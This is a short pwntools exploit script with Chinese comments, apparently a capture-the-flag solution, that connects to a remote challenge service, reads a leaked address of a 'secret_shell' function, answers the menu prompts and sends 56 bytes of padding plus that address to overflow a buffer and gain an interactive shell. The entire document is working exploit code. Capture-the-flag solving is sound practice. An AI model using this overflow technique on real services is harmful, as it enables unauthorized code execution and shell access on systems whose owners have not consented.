from pwn import *

# p = process("../src/attachment")
p = remote("172.28.52.11", 34098)
# 获取地址
p.recvuntil(b"Debug: secret_shell = ")
secret_shell_addr = int(p.recvline().strip(), 16)

# 回答问题
p.sendlineafter(b"(Y/n) ", b"Y")
p.sendlineafter("请输入选项：".encode(), b"19")

# 发送payload
p.recvuntil("告诉我你的心意吧: ".encode())
payload = b"A" * 56 + p64(secret_shell_addr)
p.sendline(payload)

p.interactive()
